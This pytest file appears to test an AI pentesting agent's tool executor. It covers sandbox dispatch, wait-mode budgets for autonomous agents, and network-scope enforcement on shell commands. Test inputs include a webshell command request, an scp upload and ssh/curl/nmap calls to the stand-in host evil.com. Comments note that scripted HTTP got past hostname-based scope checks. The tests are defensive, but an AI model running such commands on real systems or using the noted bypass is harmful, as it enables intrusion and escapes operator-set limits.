import pytest
from types import SimpleNamespace
from unittest.mock import patch, MagicMock, AsyncMock
from agent_framework.tools.executor import (
    execute_tool,
    execute_tool_with_validation,
    process_tool_invocations,
)


@pytest.fixture
def mock_agent_state():
    state = MagicMock()
    state.agent_id = "test-agent"
    state.sandbox_info = {"job_id": "test-job"}
    state.iteration = 1
    return state


@pytest.fixture
def mock_sandbox_client():
    with patch("agent_framework.services.sandbox_client.sandbox_client") as mock:
        mock.is_available = True
        mock.base_url = "http://mock-sandbox"
        mock.execute_tool = AsyncMock()
        yield mock


class TestExecutorExecution:
    @pytest.mark.asyncio
    async def test_execute_local_tool_success(self, mock_agent_state):
        mock_tool = MagicMock(return_value="tool output")
        mock_tool.__name__ = "local_tool"

        with patch(
            "agent_framework.tools.executor.get_tool_by_name", return_value=mock_tool
        ), patch(
            "agent_framework.tools.executor.should_execute_in_sandbox",
            return_value=False,
        ), patch("agent_framework.tools.executor.is_sandbox_runtime", False):
            result = await execute_tool("local_tool", mock_agent_state, arg1="val1")

            assert result == "tool output"
            mock_tool.assert_called_once()
            assert mock_tool.call_args[1]["arg1"] == "val1"

    @pytest.mark.asyncio
    async def test_execute_sandboxed_tool_direct(
        self, mock_agent_state, mock_sandbox_client
    ):
        with patch.dict(
            "os.environ", {"AGENT_SANDBOX_URL": "http://mock-sandbox"}
        ), patch(
            "agent_framework.tools.executor.should_execute_in_sandbox",
            return_value=True,
        ), patch("agent_framework.tools.executor.is_sandbox_runtime", False):
            mock_sandbox_client.execute_tool.return_value = {"result": "sandbox output"}

            result = await execute_tool("sandbox_tool", mock_agent_state, arg1="val1")

            assert result == {"result": "sandbox output"}
            mock_sandbox_client.execute_tool.assert_awaited_once()

            call_kwargs = mock_sandbox_client.execute_tool.call_args[1]
            assert call_kwargs["tool_name"] == "sandbox_tool"
            assert call_kwargs["session_id"] == "test-job"
            assert call_kwargs["kwargs"]["arg1"] == "val1"

    @pytest.mark.asyncio
    async def test_execute_tool_not_found(self, mock_agent_state):
        with patch(
            "agent_framework.tools.executor.get_tool_by_name", return_value=None
        ), patch(
            "agent_framework.tools.executor.should_execute_in_sandbox",
            return_value=False,
        ):
            result = await execute_tool("missing_tool", mock_agent_state)

            assert isinstance(result, dict)
            assert result["type"] == "NotFoundError"

    @pytest.mark.asyncio
    async def test_autonomous_child_cannot_enter_wait(
        self, mock_agent_state
    ):
        mock_agent_state.context_data = {
            "capabilities": ["enter_wait_mode"],
            "autonomous_no_wait": True,
        }
        mock_agent_state.parent_id = "parent-agent"

        result = await execute_tool("enter_wait_mode", mock_agent_state)

        assert result["type"] == "CapabilityError"
        assert "disabled for autonomous child work" in result["error"]

    @pytest.mark.asyncio
    async def test_autonomous_root_wait_is_allowed_but_bounded(
        self, mock_agent_state
    ):
        mock_agent_state.context_data = {
            "capabilities": ["enter_wait_mode"],
            "autonomous_no_wait": True,
        }
        mock_agent_state.parent_id = None

        with patch(
            "agent_framework.tools.executor.get_tool_by_name",
            return_value=MagicMock(return_value={"status": "paused"}),
        ), patch(
            "agent_framework.tools.executor.should_execute_in_sandbox",
            return_value=False,
        ), patch("agent_framework.tools.executor.is_sandbox_runtime", False):
            result = await execute_tool("enter_wait_mode", mock_agent_state)

        assert result["status"] == "paused"

    def test_autonomous_root_cannot_reopen_wait_budget(self):
        from agent_framework.tools.agent_management.actions import (
            AUTONOMOUS_COORDINATOR_WAIT_SECONDS,
            enter_wait_mode,
        )

        state = SimpleNamespace(
            agent_id="root-agent",
            parent_id=None,
            context_data={"autonomous_no_wait": True},
            tactical_memory={},
            set_waiting=MagicMock(),
        )
        with patch(
            "agent_framework.tools.agent_management.actions.db.update_agent_status"
        ), patch(
            "agent_framework.tools.agent_management.actions.db.update_agent_node_fields"
        ):
            first = enter_wait_mode(state, max_wait_seconds=600)
            second = enter_wait_mode(state, max_wait_seconds=600)

        # The window itself is a tuning value; what this test protects is that
        # a second wait with nothing in between is refused.
        assert first == {
            "status": "paused",
            "mode": "waiting",
            "max_wait_seconds": AUTONOMOUS_COORDINATOR_WAIT_SECONDS,
        }
        assert second["type"] == "CapabilityError"
        assert second["wait_budget_exhausted"] is True
        state.set_waiting.assert_called_once_with(
            timeout=AUTONOMOUS_COORDINATOR_WAIT_SECONDS
        )

    @pytest.mark.asyncio
    async def test_autonomous_wait_is_blocked_without_an_allowlist(
        self, mock_agent_state
    ):
        mock_agent_state.context_data = {"autonomous_no_wait": True}

        result = await execute_tool("enter_wait_mode", mock_agent_state)

        assert result["type"] == "CapabilityError"

    @pytest.mark.asyncio
    async def test_declared_scope_blocks_terminal_before_dispatch(self, mock_agent_state):
        mock_agent_state.context_data = {"scope": "172.28.0.0/16"}
        with patch(
            "agent_framework.tools.executor._dispatch_tool",
            new_callable=AsyncMock,
        ) as dispatch:
            result = await execute_tool(
                "run_shell_command",
                mock_agent_state,
                command="curl https://10.9.9.9/health",
            )

        # Scope is enforced on literal addresses. Hostnames are not guessed at:
        # doing so refused emails, webshell paths and the lab's own vhosts, and
        # scripted HTTP bypassed it regardless.
        assert result["type"] == "ScopeError"
        dispatch.assert_not_awaited()

    @pytest.mark.asyncio
    async def test_declared_scope_allows_lab_terminal_destination(self, mock_agent_state):
        mock_agent_state.context_data = {"scope": "172.28.0.0/16"}
        with patch(
            "agent_framework.tools.executor._dispatch_tool",
            new_callable=AsyncMock,
            return_value={"status": "ok"},
        ) as dispatch:
            result = await execute_tool(
                "run_shell_command",
                mock_agent_state,
                command="ssh alice@172.28.0.10 true",
            )

        assert result == {"status": "ok"}
        dispatch.assert_awaited_once()

    @pytest.mark.asyncio
    async def test_validation_before_execution(self, mock_agent_state):
        with patch(
            "agent_framework.tools.executor.get_tool_names", return_value=["valid_tool"]
        ), patch(
            "agent_framework.tools.executor.execute_tool", new_callable=AsyncMock
        ) as mock_exec:
            await execute_tool_with_validation("valid_tool", mock_agent_state)
            mock_exec.assert_called_once()

            mock_exec.reset_mock()
            result = await execute_tool_with_validation(
                "invalid_tool", mock_agent_state
            )
            assert result["type"] == "ValidationError"
            mock_exec.assert_not_called()


class TestToolProcessing:
    @pytest.mark.asyncio
    async def test_process_tool_invocations_parallel(self, mock_agent_state):
        with patch(
            "agent_framework.tools.executor.execute_tool_invocation",
            new_callable=AsyncMock,
        ) as mock_exec:
            mock_exec.side_effect = ["Result A", "Result B"]

            invocations = [
                {"toolName": "toolA", "args": {}},
                {"toolName": "toolB", "args": {}},
            ]
            history = []

            await process_tool_invocations(invocations, history, mock_agent_state)

            assert mock_exec.call_count == 2
            assert len(history) >= 2

            roles = [msg["role"] for msg in history]
            assert "tool_call" in roles
            assert "tool_result" in roles

            assert history[-1]["role"] == "user"
            assert "<tool_result>" in history[-1]["content"]

    @pytest.mark.asyncio
    async def test_process_tool_error_handling(self, mock_agent_state):
        with patch(
            "agent_framework.tools.executor.execute_tool_invocation",
            new_callable=AsyncMock,
        ) as mock_exec:
            mock_exec.return_value = {
                "error": "Something went wrong",
                "type": "ExecutionError",
            }

            invocations = [{"toolName": "fail_tool", "args": {}}]
            history = []

            await process_tool_invocations(invocations, history, mock_agent_state)

            result_entry = next(
                entry for entry in history if entry["role"] == "tool_result"
            )
            assert result_entry["content"]["isError"] is True
            assert result_entry["content"]["error"] == {
                "error": "Something went wrong",
                "type": "ExecutionError",
            }


class TestToolDeduplication:
    def test_deduplicate_keeps_order(self):
        from agent_framework.tools.executor import _deduplicate_invocations

        invocations = [
            {"toolName": "tool_a", "args": {"id": "first"}},
            {"toolName": "tool_b", "args": {}},
            {"toolName": "tool_a", "args": {"id": "first"}},
        ]

        result = _deduplicate_invocations(invocations)

        assert len(result) == 2
        assert result[0]["args"]["id"] == "first"

    def test_deduplicate_different_tools_same_args(self):
        from agent_framework.tools.executor import _deduplicate_invocations

        invocations = [
            {"toolName": "tool_a", "args": {"x": 1}},
            {"toolName": "tool_b", "args": {"x": 1}},
        ]

        result = _deduplicate_invocations(invocations)

        assert len(result) == 2


class TestScopeHostExtraction:
    """`user@host` is an SSH destination in one place and an email in another."""

    def test_an_email_argument_is_not_a_network_destination(self):
        from agent_framework.tools.executor import _host_candidates

        # Trying a product's documented default login is ordinary work. Swept
        # over the whole command, `user@host` matched the email and the run was
        # refused as if it had tried to reach krayincrm.com.
        assert _host_candidates("./login.sh admin@krayincrm.com 'pw'") == set()

    def test_an_ssh_target_is_still_a_network_destination(self):
        from agent_framework.tools.executor import _host_candidates

        assert "evil.com" in _host_candidates("ssh admin@evil.com")
        assert "evil.com" in _host_candidates("scp f.txt admin@evil.com:/tmp")
        assert "billing.nexus.htb" in _host_candidates(
            "curl http://billing.nexus.htb/admin/login"
        )

    def test_a_url_path_is_not_scanned_for_hostnames(self):
        from agent_framework.tools.executor import _host_candidates

        # The host is read from the URL itself; re-scanning the path treated a
        # webshell at /storage/tinymce/<hash>.php as an out-of-scope host and
        # refused the request that proved RCE.
        hosts = _host_candidates(
            "curl -s 'http://billing.nexus.htb/storage/tinymce/abc123def.php?c=id'"
        )
        assert hosts == {"billing.nexus.htb"}

    def test_an_out_of_scope_url_is_still_caught(self):
        from agent_framework.tools.executor import _host_candidates

        assert "evil.com" in _host_candidates("curl http://evil.com/a/b.php")
        assert "scanme.evil.com" in _host_candidates("nmap -p- scanme.evil.com")
